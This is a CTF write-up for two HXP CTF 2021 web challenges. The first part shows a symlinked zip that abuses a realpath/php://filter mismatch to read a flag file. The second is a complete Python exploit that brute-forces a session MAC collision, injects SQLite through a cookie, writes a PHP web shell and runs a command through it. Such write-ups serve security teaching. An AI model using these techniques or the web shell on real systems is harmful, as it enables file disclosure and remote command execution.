# HXP CTF 2021

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20211217-hxpctf2021/) of this writeup.**


 - [HXP CTF 2021](#hxp-ctf-2021)
   - [Web](#web)
     - [unzipper](#unzipper)
     - [shitty blog <g-emoji class="g-emoji" alias="brown_heart" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f90e.png">🤎</g-emoji>](#shitty-blog-)


## Web

### unzipper

Since `realpath` will not resolve `file://` or `php://`, we can create a zip with this file structure.
```
$ tree php:
php:
├── filter
│   └── resource=php:
│       └── not.txt
└── not.txt -> /flag.txt
```

`zip --symlinks -r foo.zip php:`

Then make `realpath` and `readfile` get different file with `GET /?file=php://filter/resource=php:/not.txt`.

### shitty blog 🤎

```python=
from requests import get, post
from requests.utils import unquote as decode
from requests.utils import quote as encode 
from multiprocessing import Pool, Manager
from functools import partial

target = 'http://localhost:8888'
target = 'http://65.108.176.96:8888/'
sqli_payload = encode("0;ATTACH DATABASE '/var/www/html/data/ginoah.php' AS ginoah;CREATE TABLE ginoah.pwn (dataz text);INSERT INTO ginoah.pwn (dataz) VALUES ('<?php system($_GET[cmd]); ?>garbage');//")

def collision(ses, i):
  r = get(target)
  session = decode(r.cookies['session'])
  _id, mac = session.split('|')
  if mac in ses:
    ses[mac] += 1
  else:
    ses[mac] = 1
  
def sqli(mac, ses, i):
  payload = sqli_payload.replace('garbage', str(i))
  new_session = f'{payload}|{mac}'
  r = get(target, cookies={'session': new_session})
  if len(r.text) > 0:
    ses['success'] = new_session

if __name__ == '__main__':
  manager = Manager()
  ses = manager.dict()

  col_pool = Pool()
  col_pool.map(partial(collision, ses), range(512))
  col_pool.close()
  col_pool.join()
  macs = list(filter(lambda x: x[1] > 1, ses.items()))
  if len(macs) == 0:
    print('fail finding collision in `id`, retry again')
    exit(0)

  sqli_pool = Pool()
  sqli_pool.map(partial(sqli, macs[0][0], ses), range(512))
  sqli_pool.close()
  sqli_pool.join()
  if 'success' not in ses:
    print('fail finding collision in `sqli_payload`, retry again')
    exit(0)
  
  new_session = ses['success']
  r = post(target, cookies={'session': new_session}, data={'content': 'x'})
  r = post(target, cookies={'session': new_session}, data={'delete': '1'})
  cmd = '/readflag'
  r = get(f'{target}/data/ginoah.php?cmd={cmd}', cookies={'session': new_session})
  print(r.text)
  f = open('flag.txt', 'w')
  f.write(r.text)
  f.close()
```
